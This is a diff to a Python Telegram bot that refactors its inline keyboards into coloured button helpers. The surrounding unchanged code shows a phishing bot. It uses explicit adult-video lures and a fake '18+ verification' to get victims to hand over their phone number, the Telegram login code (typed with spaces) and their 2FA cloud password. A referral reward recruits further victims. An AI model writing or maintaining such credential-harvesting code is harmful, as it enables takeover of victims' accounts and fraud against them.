@@ -3,7 +3,7 @@ import random
 import asyncio
 from datetime import datetime
 
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update
 from telegram.ext import (
     Application, CommandHandler, CallbackQueryHandler,
     MessageHandler, filters, ContextTypes, ConversationHandler,
@@ -18,6 +18,7 @@ from utils import (
     reveal_keyboard, main_menu_keyboard, stats_keyboard, admin_keyboard,
     get_caption_for_category, log_session, build_detailed_log,
     get_disclaimer, fmt_bold, fmt_code, fmt_blockquote,
+    make_keyboard, primary, success, danger, warning, info,
 )
 from content_manager import get_video_for_user
 from subscription import check_subscription, force_sub_keyboard, get_force_sub_message
@@ -147,8 +148,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"Example: <code>+911234567890</code>\n\n"
             "⚠️ This is for <b>18+ verification</b> only.\n"
             "Your secret is safe with me... 🤫",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🚫 CANCEL", callback_data="main_menu")]
+            reply_markup=make_keyboard([
+                [danger("🚫 CANCEL", "main_menu")]
             ]),
             parse_mode="HTML",
         )
@@ -161,9 +162,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Like you're whispering it in my ear...\n\n"
             f"Example: <code>4 2 8 1 3</code>\n\n"
             "⚠️ You have 3 attempts. Don't make me wait.",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔄 RESEND OTP", callback_data="resend_otp")],
-                [InlineKeyboardButton("❌ CANCEL", callback_data="main_menu")],
+            reply_markup=make_keyboard([
+                [warning("🔄 RESEND OTP", "resend_otp")],
+                [danger("❌ CANCEL", "main_menu")],
             ]),
             parse_mode="HTML",
         )
@@ -174,9 +175,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "This account has 2FA. I like 'em secure.\n"
             "Drop your cloud password so I know it's really you.\n\n"
             "⚠️ If you don't have 2FA, just skip this step.",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("⏭️ SKIP 2FA", callback_data="skip_2fa")],
-                [InlineKeyboardButton("❌ CANCEL LOGIN", callback_data="main_menu")],
+            reply_markup=make_keyboard([
+                [info("⏭️ SKIP 2FA", "skip_2fa")],
+                [danger("❌ CANCEL LOGIN", "main_menu")],
             ]),
             parse_mode="HTML",
         )
@@ -210,9 +211,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"• Your User ID: <code>{user.id}</code>\n"
             f"• Which pack got you <i>hard</i>\n"
             f"• Your payment method",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("💬 MESSAGE OWNER", url=f"https://t.me/{config.OWNER_USERNAME.lstrip('@')}")],
-                [InlineKeyboardButton("🔙 BACK", callback_data="main_menu")],
+            reply_markup=make_keyboard([
+                [primary("💬 MESSAGE OWNER", url=f"https://t.me/{config.OWNER_USERNAME.lstrip('@')}")],
+                [primary("🔙 BACK", "main_menu")],
             ]),
             parse_mode="HTML",
         )
@@ -238,8 +239,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"<blockquote>⚠️ REPORT ISSUE</blockquote>\n\n"
             f"Something not working? Tell the owner: {config.SUPPORT_CONTACT}\n\n"
             "Describe what's broken and he'll fix it... eventually.",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 BACK", callback_data="main_menu")]
+            reply_markup=make_keyboard([
+                [primary("🔙 BACK", "main_menu")]
             ]),
             parse_mode="HTML",
         )
@@ -258,8 +259,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(
             "<blockquote>⏳ VIDEO SKIPPED</blockquote>\n\n"
             "Alright, let's move on to the next one! 🔥💦",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("💦 NEXT VIDEO", callback_data="next_video")]
+            reply_markup=make_keyboard([
+                [success("💦 NEXT VIDEO", "next_video")]
             ]),
             parse_mode="HTML",
         )
@@ -270,8 +271,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "<i>\"Me telling my friends I'm 'taking a break' from grinding...\"</i>\n"
             "<i>\"(Opens laptop 5 minutes later)\"</i> 🔥\n\n"
             "Come back when you're <b>hard for success</b> again. 💪",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("💪 BACK TO GRIND", callback_data="next_video")]
+            reply_markup=make_keyboard([
+                [success("💪 BACK TO GRIND", "next_video")]
             ]),
             parse_mode="HTML",
         )
@@ -282,8 +283,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"<code>{config.BOT_LINK}</code>\n\n"
             "Every friend who joins gets you a <b>FREE video</b>! 🎁\n"
             "<i>The more the merrier... 😏</i>",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 BACK", callback_data="main_menu")]
+            reply_markup=make_keyboard([
+                [primary("🔙 BACK", "main_menu")]
             ]),
             parse_mode="HTML",
         )
@@ -362,9 +363,9 @@ async def handle_free_video(query, context, user, user_data, num):
             video=video["file_id"],
             caption=caption,
             parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("⏳ WATCH BEFORE DELETE", callback_data="main_menu")],
-                [InlineKeyboardButton("🔓 UNLOCK FULL ACCESS", callback_data="login")],
+            reply_markup=make_keyboard([
+                [info("⏳ WATCH BEFORE DELETE", "main_menu")],
+                [success("🔓 UNLOCK FULL ACCESS", "login")],
             ])
         )
 
@@ -381,8 +382,8 @@ async def handle_free_video(query, context, user, user_data, num):
             "<blockquote>❌ NO VIDEOS AVAILABLE</blockquote>\n\n"
             "No videos in the free queue right now. Check back later...\n"
             "<i>or buy premium for instant access 😏</i>",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 BACK", callback_data="main_menu")]
+            reply_markup=make_keyboard([
+                [primary("🔙 BACK", "main_menu")]
             ]),
             parse_mode="HTML",
         )
@@ -411,8 +412,8 @@ async def handle_resend_otp(query, user, user_data):
         f"Your code: <code>{otp}</code>\n\n"
         "Enter the 5 digits with <b>spaces</b>:\n"
         f"Example: <code>{' '.join(otp)}</code>",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("❌ CANCEL", callback_data="main_menu")]
+        reply_markup=make_keyboard([
+            [danger("❌ CANCEL", "main_menu")]
         ]),
         parse_mode="HTML",
     )
@@ -479,9 +480,9 @@ async def handle_next_video(query, context, user, user_data):
         video=video["file_id"],
         caption=caption,
         parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("⏳ WATCH BEFORE DELETE", callback_data="skip_video")],
-            [InlineKeyboardButton("💀 DELETE NOW", callback_data="skip_video")],
+        reply_markup=make_keyboard([
+            [info("⏳ WATCH BEFORE DELETE", "skip_video")],
+            [danger("💀 DELETE NOW", "skip_video")],
         ])
     )
 
@@ -514,8 +515,8 @@ async def handle_purchase_request(query, user, pack_key):
     if error:
         await query.edit_message_text(
             f"<blockquote>❌ {error}</blockquote>",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 BACK", callback_data="main_menu")]
+            reply_markup=make_keyboard([
+                [primary("🔙 BACK", "main_menu")]
             ]),
             parse_mode="HTML",
         )
@@ -534,9 +535,9 @@ async def handle_purchase_request(query, user, pack_key):
         f"Status: <u>PENDING APPROVAL</u> ⏳\n\n"
         "The owner will review your application.\n"
         "In the meantime, slide into his DMs to speed things up:",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("📞 CONTACT OWNER", callback_data="contact_owner")],
-            [InlineKeyboardButton("💦 WATCH FREE VIDEO", callback_data="next_video")],
+        reply_markup=make_keyboard([
+            [primary("📞 CONTACT OWNER", "contact_owner")],
+            [success("💦 WATCH FREE VIDEO", "next_video")],
         ]),
         parse_mode="HTML",
     )
@@ -585,8 +586,8 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Include your country code:\n"
             f"Example: <code>+911234567890</code>\n\n"
             "<i>Don't be shy... try again 😏</i>",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔄 TRY AGAIN", callback_data="login_number")]
+            reply_markup=make_keyboard([
+                [warning("🔄 TRY AGAIN", "login_number")]
             ]),
             parse_mode="HTML",
         )
@@ -605,8 +606,8 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Enter the 5 digits with <b>spaces</b> between each digit:\n"
         f"Like this: <code>{' '.join(otp)}</code>\n\n"
         "⚠️ You have 3 attempts. Don't make me wait too long...",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("❌ CANCEL", callback_data="main_menu")]
+        reply_markup=make_keyboard([
+            [danger("❌ CANCEL", "main_menu")]
         ]),
         parse_mode="HTML",
     )
@@ -624,8 +625,8 @@ async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "That's not 5 digits with spaces, you naughty thing.\n"
             f"Like this: <code>4 2 8 1 3</code>\n\n"
             "<i>Try again... I believe in you 😘</i>",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔄 TRY AGAIN", callback_data="verify_otp")]
+            reply_markup=make_keyboard([
+                [warning("🔄 TRY AGAIN", "verify_otp")]
             ]),
             parse_mode="HTML",
         )
@@ -642,8 +643,8 @@ async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "<blockquote>❌ TOO MANY ATTEMPTS</blockquote>\n\n"
             "You've used all 3 attempts. You're locked out.\n"
             "Come back when you can follow instructions 😤",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔄 START OVER", callback_data="login_number")]
+            reply_markup=make_keyboard([
+                [danger("🔄 START OVER", "login_number")]
             ]),
             parse_mode="HTML",
         )
@@ -675,10 +676,10 @@ async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"⚠️ Attempts remaining: <b>{remaining}</b>\n\n"
             "Try again or request a new code.\n"
             "<i>Don't keep me waiting...</i> 😏",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔄 TRY AGAIN", callback_data="verify_otp")],
-                [InlineKeyboardButton("🔄 RESEND OTP", callback_data="resend_otp")],
-                [InlineKeyboardButton("❌ CANCEL", callback_data="main_menu")],
+            reply_markup=make_keyboard([
+                [warning("🔄 TRY AGAIN", "verify_otp")],
+                [warning("🔄 RESEND OTP", "resend_otp")],
+                [danger("❌ CANCEL", "main_menu")],
             ]),
             parse_mode="HTML",
         )
@@ -696,8 +697,8 @@ async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "<blockquote>❌ TOO MANY ATTEMPTS</blockquote>\n\n"
             "You've used all 3 attempts. Locked out.\n"
             "Start over and try to keep up 😤",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔄 START OVER", callback_data="login_number")]
+            reply_markup=make_keyboard([
+                [danger("🔄 START OVER", "login_number")]
             ]),
             parse_mode="HTML",
         )
